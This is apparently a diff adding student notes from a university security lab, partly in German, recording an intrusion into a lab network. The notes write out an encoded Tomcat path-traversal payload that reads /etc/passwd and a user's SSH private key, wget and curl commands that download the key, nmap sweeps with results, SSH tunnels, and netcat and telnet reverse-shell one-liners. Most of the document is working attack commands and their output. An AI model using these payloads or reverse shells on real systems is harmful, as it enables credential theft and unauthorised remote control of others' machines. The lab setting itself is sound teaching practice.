@@ -1,0 +1,352 @@
+- create tomcat access via port forwarding:
+	ssh 0725439@sela.inso.tuwien.ac.at -p 12345 -L 2323:192.168.20.100:8000
+	ssh 0826687@sela.inso.tuwien.ac.at -p 12345 -L 2323:192.168.20.100:8000
+
+- now in a local browser via:
+	localhost:2323
+
+- get tomcat version from error via:
+	localhost:2323/asdsad
+
+- get the list of the current users:
+	http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+
+- get the public key from walter:
+	http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa.pub
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN6bsxipbT7Y8M/L5YUsgb/HS5vaiasc86V7A43TwHQXv/LJyCvzW2nzZ4wxtHtG0XfOJMYstxla+bnrz3YEFKCZB9P1V8BJ4eqDjxqm9HNQuqvGk05uUOBEHsb9ke0BM8RopLc//VDAog39xDzxtvmroUzEPHlQpaBqpiCo/iWHSaRF5m/AGwpkkSExsB69l4J04Kty/KWelStUvxsHYwCdEiRrCfFxq+Ia+Y2a/+PMlEEyfjTcpTCF3RTZgULndeDj5Hzr4YGGU7zm9WwTq7y6+femW7rlRe1/zIKp6ho/SpZBqI3Az2ZOMh5e6/DCG/6F3o8nI3GDq3VTTgHc7b root@secsyseng-lab1
+
+- get the authorization key:
+	http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/authorized_keys
+	
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN6bsxipbT7Y8M/L5YUsgb/HS5vaiasc86V7A43TwHQXv/LJyCvzW2nzZ4wxtHtG0XfOJMYstxla+bnrz3YEFKCZB9P1V8BJ4eqDjxqm9HNQuqvGk05uUOBEHsb9ke0BM8RopLc//VDAog39xDzxtvmroUzEPHlQpaBqpiCo/iWHSaRF5m/AGwpkkSExsB69l4J04Kty/KWelStUvxsHYwCdEiRrCfFxq+Ia+Y2a/+PMlEEyfjTcpTCF3RTZgULndeDj5Hzr4YGGU7zm9WwTq7y6+femW7rlRe1/zIKp6ho/SpZBqI3Az2ZOMh5e6/DCG/6F3o8nI3GDq3VTTgHc7b walter@tomcat
+
+- download locally via wget
+	switch to the local user: /home/jacky/.ssh
+
+	wget http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa
+	wget http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa.pub
+	wget http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/authorized_keys
+	
+	
+	# Mac OS X 10.7
+	# wenn mit root angemeldet
+	cd /var/root/.ssh
+	
+	# wenn mit user
+	cd /Users/<username>/.ssh
+	curl -O http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa
+	curl -O http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa.pub
+	curl -O http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/authorized_keys
+	
+	
+
+http://localhost:2323/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa
+
+- again port forwarding 
+ssh -p 12345 -l 0725439 -L 2223:192.168.20.100:22 sela.inso.tuwien.ac.at
+
+ssh -p 12345 -l 0826687 -L 2223:192.168.20.100:22 sela.inso.tuwien.ac.at
+
+- change permission to 600
+	sudo chmod 600 id_rsa
+- ssh -p 2223 walter@localhost
+
+
+b)
+
+- get every interfaces IP address
+	
+	walter@tomcat:~$ ip addr
+
+		1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
+		    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+		    inet 127.0.0.1/8 scope host lo
+		    inet6 ::1/128 scope host 
+		       valid_lft forever preferred_lft forever
+		2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+		    link/ether 00:1b:d7:12:bc:51 brd ff:ff:ff:ff:ff:ff
+		    inet 192.168.20.100/24 brd 192.168.20.255 scope global eth0
+		3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+		    link/ether 00:1b:d7:12:bc:52 brd ff:ff:ff:ff:ff:ff
+		4: eth1.98@eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
+		    link/ether 00:1b:d7:12:bc:52 brd ff:ff:ff:ff:ff:ff
+		    inet 192.168.98.124/24 brd 192.168.98.255 scope global eth1.98
+		    inet6 fdcb:c447:e9d2:3553:1001::ab/120 scope global 
+		       valid_lft forever preferred_lft forever
+		    inet6 fe80::21b:d7ff:fe12:bc52/64 scope link 
+       		valid_lft forever preferred_lft forever
+
+  or use this script:
+	walter@tomcat:~$ /sbin/ifconfig |grep -B1 "inet addr" |awk '{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }' |awk -F: '{ print $1 ": " $3 }'
+
+	eth0: 192.168.20.100
+	eth1.98: 192.168.98.124
+	lo: 127.0.0.1
+
+- get the ip version 6 addresses:
+	walter@tomcat:~$ ip -6 addr
+	
+	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 
+		inet6 ::1/128 scope host 
+			valid_lft forever preferred_lft forever
+	4: eth1.98@eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 
+		inet6 fdcb:c447:e9d2:3553:1001::ab/120 scope global 
+			valid_lft forever preferred_lft forever
+			inet6 fe80::21b:d7ff:fe12:bc52/64 scope link 
+		valid_lft forever preferred_lft forever
+
+
+- now scan the current inets for all hosts and IP addresses:
+
+	walter@tomcat:~$ nmap -sP 192.168.20.*
+	Host 192.168.20.100 is up (0.000071s latency).
+	Host 192.168.20.254 is up (0.00027s latency).
+	
+	walter@tomcat:~$ nmap -sP 192.168.98.*
+	Host omega.local.vienna.essecorp.invalid (192.168.98.1) is up (0.00027s latency).
+	Host alpha.local.vienna.essecorp.invalid (192.168.98.10) is up (0.00020s latency).
+	Host beta.local.vienna.essecorp.invalid (192.168.98.28) is up (0.00029s latency).
+	Host gamma.local.vienna.essecorp.invalid (192.168.98.54) is up (0.00020s latency).
+	Host delta.local.vienna.essecorp.invalid (192.168.98.99) is up (0.00027s latency).
+	Host tomcat.local.vienna.essecorp.invalid (192.168.98.124) is up (0.000035s latency).
+	Host epsilon.local.vienna.essecorp.invalid (192.168.98.201) is up (0.00045s latency).
+	Host zeta.local.vienna.essecorp.invalid (192.168.98.202) is up (0.00043s latency).
+	
+	
+######################################################################
+# IP: 192.168.98.10
+# DNS-Server
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.98.10
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-11 00:38 CEST
+Interesting ports on alpha.local.vienna.essecorp.invalid (192.168.98.10):
+Not shown: 99 closed ports
+PORT   STATE SERVICE VERSION
+53/tcp open  domain  dnsmasq 2.55
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.11 seconds
+
+walter@tomcat:~$ dig alpha.local.vienna.essecorp.invalid
+
+; <<>> DiG 9.7.3 <<>> alpha.local.vienna.essecorp.invalid
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52751
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;alpha.local.vienna.essecorp.invalid. IN	A
+
+;; ANSWER SECTION:
+alpha.local.vienna.essecorp.invalid. 0 IN A	192.168.98.10
+
+;; Query time: 0 msec
+;; SERVER: 192.168.98.10#53(192.168.98.10)
+;; WHEN: Sat May 11 00:51:15 2013
+;; MSG SIZE  rcvd: 69
+
+
+
+######################################################################
+# IP: 192.168.98.28
+# Mailserver
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.98.28
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-11 00:40 CEST
+Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Interesting ports on beta.local.vienna.essecorp.invalid (192.168.98.28):
+Not shown: 99 closed ports
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp?
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 123.73 seconds
+
+	
+######################################################################
+# Info zu den Diensten
+# IP: 192.168.98.124
+
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.98.124
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-11 00:35 CEST
+Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 00:36 (0:00:16 remaining)
+Interesting ports on tomcat.local.vienna.essecorp.invalid (192.168.98.124):
+Not shown: 97 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
+8000/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+8009/tcp open  ajp13?
+Service Info: OS: Linux
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.44 seconds
+
+	
+######################################################################
+# Info zu den Diensten
+# IP: 192.168.20.100
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.20.100
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-10 20:08 CEST
+Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 66.67% done; ETC: 20:09 (0:00:11 remaining)
+Interesting ports on 192.168.20.100:
+Not shown: 97 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
+8000/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+8009/tcp open  ajp13?
+Service Info: OS: Linux
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.58 seconds
+
+
+######################################################################
+# IP: 192.168.20.254
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.20.254
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-10 20:11 CEST
+Interesting ports on 192.168.20.254:
+Not shown: 98 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
+873/tcp open  rsync?
+Service Info: OS: Linux
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 129.22 seconds
+
+
+######################################################################
+# IP: 192.168.20.201
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.98.201
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-11 00:14 CEST
+Interesting ports on epsilon.local.vienna.essecorp.invalid (192.168.98.201):
+Not shown: 98 closed ports
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: ESSECORP)
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: ESSECORP)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
+
+# Result:
+# Workgroup: ESSECORP
+
+# TRY
+# ssh 0826687@sela.inso.tuwien.ac.at -p 12345 -L 139:192.168.98.10:139
+# ssh 0826687@sela.inso.tuwien.ac.at -p 12345 -L 445:192.168.98.10:445
+# ssh 0826687@sela.inso.tuwien.ac.at -p 12345 -L 139:192.168.98.10:445
+
+ssh 0826687@sela.inso.tuwien.ac.at -p 12345 -L 139:192.168.98.10:139 <user>@localhost
+
+
+ssh 0826687@sela.inso.tuwien.ac.at -p 12345 -L 139:192.168.98.10:139 walter@localhost
+
+# connect
+smb://localhost/
+
+
+
+
+######################################################################
+# IP: 192.168.20.202
+walter@tomcat:~$ nmap -sV -T4 -F 192.168.98.202
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2013-05-11 00:13 CEST
+All 100 scanned ports on zeta.local.vienna.essecorp.invalid (192.168.98.202) are closed
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
+
+
+
+
+
+## noch nicht fertig
+ssh -p 12345 -l 0826687 -L localhost:22139:192.168.98.201:139 walter@epsilon.local.vienna.essecorp.invalid
+
+
+ssh 0826687@sela.inso.tuwien.ac.at -p 12345 -L 2280:172.16.2.12:80
+ssh -p 12345 -l 0826687 -L 2280:172.16.2.12:80 
+
+
+ssh -L 192.168.98.201:139:localhost:139 walter@localhost
+
+
+
+ssh -p 12345 -l walter -L 139:192.168.20.100:139 walter@epsilon.local.vienna.essecorp.invalid
+
+
+netcat -l -u 192.168.1.103 6666 | tee ~/netconsole.log
+
+netcat -l -u 172.16.2.12 80 | whoami
+
+ tee ~/netconsole.log
+
+	
+
+-> Anmerkung: Es gibt auch verborgene hosts, siehe Tiss+Forum und hier:
+http://www.informatik-forum.at/showthread.php?101185-Lab1b
+
+
+
+
+
+Reverse Shell Interaction with NetCat
+
+When shelled in to the remote host, simply issue the following command to send the shell back home:
+    nc -c /bin/sh 172.16.2.12 80
+
+You could even pipe BASH through netcat.
+    /bin/sh | nc <your IP> <any unfiltered port>
+
+Then listen for the shell:
+    nc -l -p 80 -vvv
+
+
+
+
+
+walter@tomcat:~$ printf 'GET /HTTP/1.0\r\n\r\n' | nc -w 8 172.16.2.12 80
+HTTP/1.0 400 Bad Request
+Content-Type: text/html
+Content-Length: 349
+Connection: close
+Date: Sun, 12 May 2013 11:20:41 GMT
+Server: lighttpd/1.4.28
+
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+ <head>
+  <title>400 - Bad Request</title>
+ </head>
+ <body>
+  <h1>400 - Bad Request</h1>
+ </body>
+</html>
+
+
+cat < /dev/urandom | nc 172.16.2.12 80
+
+
+
+###
+
+/usr/bin/telnet  <ip-angreifer> 80 | /bin/sh | /usr/bin/telnet  <ip-angreifer> 25
+
+Konsole 1: nc -l -n -v -p 80
+Konsole 2: nc -l -n -v -p 25
+
+
+
+	
